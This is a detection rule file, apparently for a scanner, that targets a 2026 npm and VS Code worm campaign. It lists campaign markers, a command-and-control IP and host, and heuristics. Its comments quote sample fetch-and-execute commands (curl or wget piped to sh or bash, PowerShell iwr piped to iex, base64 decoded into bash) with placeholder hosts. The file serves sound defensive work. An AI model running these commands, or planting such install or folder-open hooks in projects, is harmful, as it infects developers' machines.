  # --- 2026 worm variants (seen across 431 infected repos, Jan-Sep 2026) ---
  # The payload marker is written with and without spaces, with A8/A9
  # prefixes and two- or three-part IDs (global.i = 'A8-1144-1',
  # global.i="A9-8463-11", global.i = 'A8-7753'), or as global['!']='9-8463-11'.
  - id: campaign-global-i-regex
    kind: regex
    pattern: "global\\.i\\s*=\\s*['\"][A-Z]?\\d+-\\d+(?:-\\d+)?['\"]"
    description: "Campaign marker assignment global.i = '<campaign id>' (any spacing, A8/A9 families)"
    exact: true

  - id: campaign-global-bang-regex
    kind: regex
    pattern: "global\\[['\"]!['\"]\\]\\s*=\\s*['\"]\\d+-\\d+(?:-\\d+)?['\"]"
    description: "Campaign marker assignment global['!'] = '<campaign id>' (all observed IDs, not just 8-270-2)"
    exact: true

  - id: campaign-global-t-regex
    kind: regex
    pattern: "global\\[['\"]_t_[a-z0-9]['\"]\\]\\s*="
    description: "Campaign runtime global assignment (global['_t_s'], global['_t_c'], ...)"
    exact: true

  - id: campaign-id-a9-regex
    kind: regex
    pattern: "['\"]A9-\\d{3,5}-\\d{1,3}['\"]"
    description: "Campaign identifier pattern (A9-####-# family, e.g. A9-8463-11)"
    exact: true

  - id: obfuscator-string-table
    kind: string
    pattern: "_0x4925"
    description: "String-table function name of the campaign's obfuscated payload"
    exact: true

  - id: c2-ip-166-88-134-75
    kind: string
    pattern: "166.88.134.75"
    description: "Known command-and-control server address"
    exact: true

  - id: c2-host-260120-vercel
    kind: string
    pattern: "260120.vercel.app"
    description: "Known stage-two download host used by the VS Code folder-open task"
    exact: true

  - id: fake-font-loader
    kind: heuristic
    heuristic: fake-font
    description: "Font file (.woff/.woff2/.ttf/.otf/.eot/.llf) that is really JavaScript: the campaign's loader"
    exact: true
    # Detects: public/fonts/fa-solid-400.woff2, fa-solid-900.woff2 (also in
    # nested folders), fa-solid-300.llf and fa-solid-600.eot whose content is
    # plain-text JavaScript. Why it's not a false-positive magnet: real fonts
    # are binary and start with a known magic number (wOF2, wOFF, OTTO,
    # 0x00010000, or the EOT 0x504C marker); the check also requires the file
    # to be mostly printable text AND to contain code shapes.

  - id: vscode-autorun-loader-task
    kind: heuristic
    heuristic: vscode-autorun-task
    description: ".vscode/tasks.json runs code when the folder is opened (node on a font file, or curl/wget piped into a shell)"
    exact: true
    # Detects: "runOn": "folderOpen" together with `node ./public/fonts/x.woff2`
    # or `curl https://.../settings/linux | sh`. Why it's not a false-positive
    # magnet: legitimate folder-open tasks (a watcher, a lint run) never execute
    # a font file or pipe a download into a shell.

  - id: vscode-auto-tasks-enabled
    kind: heuristic
    heuristic: vscode-auto-tasks-enabled
    description: ".vscode/settings.json turns on automatic tasks, so a folder-open task runs without a prompt"
    exact: false

  - id: hidden-whitespace-payload
    kind: heuristic
    heuristic: hidden-whitespace-payload
    description: "Code hidden after a long run of spaces/tabs on the same line (pushes the payload off-screen in editors)"
    exact: false
    # In config files this shape is a heuristic hit (usually alongside
    # long-line, giving HIGH). With --deep it also checks every *.js/*.mjs/*.cjs
    # file outside node_modules/dist/build, but there it only reports when a
    # campaign marker follows the whitespace, because minified bundles can
    # share the shape; such a hit is reported as an exact match.

  # --- Heuristics (fuzzy, contribute to MODERATE/HIGH via count thresholds) ---
  - id: heuristic-long-line
    kind: heuristic
    heuristic: long-line
    description: "Line exceeding ~2000 chars in a target config file (packed/obfuscated payload signal)"
    exact: false

  - id: heuristic-spawn-detached-eval
    kind: heuristic
    heuristic: spawn-detached-eval
    description: "child_process spawn with detached:true combined with eval or dynamic require/import of remote content"
    exact: false

  - id: heuristic-eth-address
    kind: heuristic
    heuristic: eth-address
    description: "Ethereum-address-like string (0x + 40 hex chars) in a config file with no legitimate reason to reference one"
    exact: false

  - id: heuristic-gitignore-worm-marker
    kind: heuristic
    heuristic: gitignore-worm-marker
    description: ".gitignore references worm self-exclusion batch files (temp_auto_push.bat, temp_interactive_push.bat, config.bat)"
    exact: false

  # --- npm-postinstall-worm heuristics ---
  # Scoped to package.json's auto-run lifecycle hooks only (preinstall,
  # install, postinstall, prepare — the scripts npm executes on its own
  # during `npm install`, without the developer explicitly invoking them).
  # Ordinary scripts like "test"/"build"/"start" are deliberately excluded:
  # those require an explicit `npm run`, so they're not part of the
  # install-time worm vector and including them would just add noise.
  - id: heuristic-postinstall-curl-pipe-shell
    kind: heuristic
    heuristic: postinstall-curl-pipe-shell
    description: "package.json lifecycle script (preinstall/install/postinstall/prepare) pipes a curl/wget download straight into a shell interpreter"
    exact: false
    # Detects: "postinstall": "curl -fsSL https://x/y.sh | bash" and wget
    # variants. Why it's not a false-positive magnet: legitimate installers
    # never need to fetch-and-immediately-execute a remote shell script as
    # part of `npm install` — if a package needs a downloaded asset it saves
    # it to a file first. curl/wget piped directly into sh/bash/zsh is
    # exactly the classic self-propagating "curl | bash" worm pattern and
    # has essentially no legitimate use inside an npm lifecycle hook.

  - id: heuristic-postinstall-powershell-cradle
    kind: heuristic
    heuristic: postinstall-powershell-cradle
    description: "package.json lifecycle script contains a PowerShell download-cradle (iwr/irm piped into iex) — the Windows-targeting worm variant"
    exact: false
    # Detects: "preinstall": "iwr -useb https://x/y.ps1 | iex" (and
    # Invoke-WebRequest/Invoke-RestMethod/Invoke-Expression spellings). Why
    # it's not a false-positive magnet: npm packages target Node, which is
    # already cross-platform — there's no legitimate reason for a package.json
    # lifecycle script to shell out to a raw PowerShell download-and-execute
    # cradle; this specific idiom is a well-known indicator used almost
    # exclusively by malware droppers.

  - id: heuristic-postinstall-base64-shell
    kind: heuristic
    heuristic: postinstall-base64-shell
    description: "package.json lifecycle script decodes a base64 blob and pipes it straight into a shell interpreter"
    exact: false
    # Detects: "install": "echo <b64> | base64 -d | bash" (and openssl
    # enc -d variants). Why it's not a false-positive magnet: legitimate
    # install scripts have no reason to hide their own command from a plain
    # read of package.json — base64-then-exec in a lifecycle hook is a
    # deliberate obfuscation technique to dodge keyword/URL scanning, not a
    # pattern that shows up in ordinary tooling.
